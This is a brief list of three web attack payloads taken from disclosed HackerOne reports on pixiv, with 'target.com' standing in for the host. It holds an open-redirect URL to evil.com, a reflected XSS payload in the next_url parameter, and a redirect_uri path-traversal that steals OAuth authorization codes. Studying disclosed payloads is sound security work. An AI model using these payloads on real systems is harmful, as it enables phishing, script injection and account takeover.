# pixiv

3 payloads.

### `e3365d79`

```
https://target.com/jump.php?https%3A%2F%2Fevil.com%2Fabc
```

— [Open redirect protection (https://target.com/jump.php) is broken for novels](https://hackerone.com/reports/541862) · pixiv · [katsuragicsl](https://hackerone.com/katsuragicsl) · $200.0

### `ac6b8b2a`

```
https://target.com/resign_request/success?next_url=javascript%3Aalert%2F**%2F(document.domain
```

**Parameter:** `next_url`
— [XSS Reflected at https://target.com/ Via `next_url`](https://hackerone.com/reports/1503601) · pixiv · [find_me_here](https://hackerone.com/find_me_here)

### `8b7bb862`

```
redirect_uri=https%3A%2F%2Ftarget.com%2Fusers%2Fauth%2Fpixiv%2Fcallback/../../../../ja/items/4503924
```

**Parameter:** `redirect_uri`
— [Stealing Users OAuth authorization code via redirect_uri](https://hackerone.com/reports/1861974) · pixiv · [kuzu7shiki](https://hackerone.com/kuzu7shiki) · $2,000.0
